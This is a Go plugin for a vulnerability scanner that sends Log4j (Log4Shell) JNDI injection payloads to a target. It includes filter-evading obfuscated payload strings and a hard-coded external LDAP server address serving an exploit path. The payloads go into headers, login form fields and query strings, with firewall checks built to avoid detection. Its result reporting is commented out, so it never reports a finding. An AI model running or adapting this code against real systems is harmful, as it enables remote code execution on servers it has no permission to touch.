package mypocs

import (
	"fmt"
	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"github.com/deenrookie/kunpeng-plus/utils"
	util "github.com/deenrookie/kunpeng-plus/utils"
	"net/http"
	"strings"
)

type log4jRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("log4j", &log4jRCE{})
}

func (d *log4jRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "log4j RCE",
		Remarks: "log4j 远程命令执行",
		Level:   0,
		Type:    "RCE",
		Author:  "Deen",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/262670",
			CVE:  "",
			KPID: "KP-1002",
		},
	}
	return d.info
}

func (d *log4jRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
	domain := util.GetHostFromUrl(URL)

	if domain == "" {
		return false
	}

	_ = meta
	randString := utils.RandStringRunes(6)
	// count := 0
	randStr := domain + ".${:-" + randString + "}"
	// trueWord := domain + "." + randString
	// randStr = "nowqq" + utils.RandStringRunes(6)
	fmt.Println(domain)
	payloads := []string{
		//"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
		//"${jndi:lda${:-}p://",
		//"${j${aaa::::-n}di:ldap://",
		//"${j${aaa::::-n}d${:-}i:ldap://",
		//"${j${aaa::::-n}d${:-}i:ldap://",
		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-p:}//",
		"${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://",
		"${jn${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${:-}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}d}}}}}}}}i}}}}:ldap://",
	}

	reqPaths := []string{
		"/",
		"/admin",
		"/login",
		"/signin",
		"/error",
		"/api",
		"/redirect",
	}

	headers := []string{
		"Origin",
		"Referer",
	}

	methods := []string{
		"GET",
		"POST",
	}

	//client := http.Client{
	//	//Transport: &http.Transport{
	//	//	// 设置代理
	//	//	Proxy: http.ProxyURL(uri),
	//	//},
	//}
	// fmt.Println(randStr)

	timeOutCount := 0
	normalRequestCount := 0
	totalCount := 0

	for _, payload := range payloads {
		// fullPayload := payload
		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
		fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
		for _, reqPath := range reqPaths {
			for _, method := range methods {
				var request *http.Request
				if method == "POST" {
					postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload)
					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
				} else {
					request, _ = http.NewRequest(method, URL+reqPath, nil)
				}
				// fmt.Println(count)
				for _, header := range headers {

					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
						return false
					}

					request.Header.Set(header, fullPayload)
					setHeaders(request, fullPayload)

					totalCount++
					resp, err := util.RequestDo(request, false)

					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
					if &resp != nil && err == nil {
						if resp.Other != nil {
							normalRequestCount++
							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
								strings.Contains(string(resp.Body), "WAF") ||
								strings.Contains(string(resp.Body), "防火墙") {
								return false
							}
						}
					} else if err != nil {
						timeOutCount++
					}

				}

				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
				for _, header := range headers {
					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
						return false
					}
					request.Header.Set(header, fullPayload)
					setHeaders(request, fullPayload)

					totalCount++
					resp, err := util.RequestDo(request, false)
					if &resp != nil && err == nil {
						normalRequestCount++
						if resp.Other != nil {
							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
								strings.Contains(string(resp.Body), "WAF") ||
								strings.Contains(string(resp.Body), "防火墙") {
								return false
							}
						}
					} else if err != nil {
						timeOutCount++
					}
				}
				// fmt.Println(count)
				// count++
				//if utils.IsExistDNSLog(trueWord) {
				//	result := d.info
				//	result.Response = "TEST"
				//	result.Request = "TEST"
				//	d.result = append(d.result, result)
				//	return true
				//}
			}
		}

	}

	//time.Sleep(time.Duration(5) * time.Second)
	//
	//if utils.IsExistDNSLog(trueWord) {
	//	result := d.info
	//	result.Response = "TEST"
	//	result.Request = "TEST"
	//	d.result = append(d.result, result)
	//	return true
	//}
	return false
}
